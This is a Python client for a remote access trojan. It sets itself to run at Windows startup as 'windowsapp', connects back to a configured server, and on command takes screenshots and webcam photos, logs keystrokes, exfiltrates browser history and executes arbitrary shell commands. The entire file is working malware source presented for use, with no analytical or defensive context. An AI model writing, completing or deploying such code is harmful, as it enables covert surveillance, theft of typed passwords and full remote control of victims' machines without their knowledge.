from host import Host
from getpass import getuser
from pynput.keyboard import Listener
from timer import Timer
from pathlib import Path
from json import load
from start_run import run_at_startup_set
from os import getcwd, remove


path = Path(__file__).absolute().parent.joinpath("clientSetting.json")
with open(path.as_posix(), "r") as f:
    data = load(f)

path = Path(getcwd()).absolute().joinpath(data["namefile"]).as_posix()

run_at_startup_set("windowsapp", path)

HOST = data.get("host", "localhost")
PORT = int(data.get("port", 9999))
while True:
    try:
        host = Host(getuser())
        host.start_connection(HOST, PORT)

        str_for_keylogger = ""

        def on_press(key):
            global str_for_keylogger
            letter = getattr(key, "char", None)
            if letter:
                str_for_keylogger += letter
            if not timer.on:
                return False

        while True:
            task = host.wait_task()

            if task == "screenshot":
                host.send_screenshot()
            elif task == "camera":
                host.send_photo_camera()
            elif task == "sendfile": # recvfile froms server
                pass
            elif task == "recvfile": # send file to server
                pass
            elif task.startswith("keylogger"):
                time = task.replace("keylogger", "").strip()
                str_for_keylogger  = ""
                keyboard_listener = Listener(on_press=on_press)
                timer = Timer(int(time))
                keyboard_listener.start()
                timer.start()
                host.send_str(str_for_keylogger)

            elif task.startswith("historial"):
                browser = task.replace("historial", "").strip()
                host.send_browser_historial(browser)
                

            elif task == "exit":
                host.end_connection()
                break
            else:  # execute in terminarl
                host.execute_terminal(task)
    except ConnectionRefusedError:
        pass
    except ConnectionResetError:
        pass